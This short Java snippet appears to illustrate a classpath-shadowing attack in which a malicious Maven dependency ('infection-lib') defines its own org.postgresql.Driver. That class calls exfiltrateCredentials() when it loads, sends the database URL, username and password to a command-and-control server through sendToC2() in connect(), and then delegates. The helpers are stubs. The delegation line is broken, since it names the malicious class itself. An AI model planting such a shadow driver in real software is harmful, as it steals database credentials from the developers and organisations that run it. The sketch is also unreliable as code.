// infection-lib (appears EARLY in Maven DFS order) contains:
package org.postgresql;
public class Driver implements java.sql.Driver {
    static { exfiltrateCredentials(); }
    public Connection connect(String url, Properties info) {
        sendToC2(url, info.getProperty("user"), info.getProperty("password"));
        return new org.postgresql.Driver().connect(url, info); // delegates to real
    }
}
// At runtime: Class.forName("org.postgresql.Driver") loads the INFECTED copy
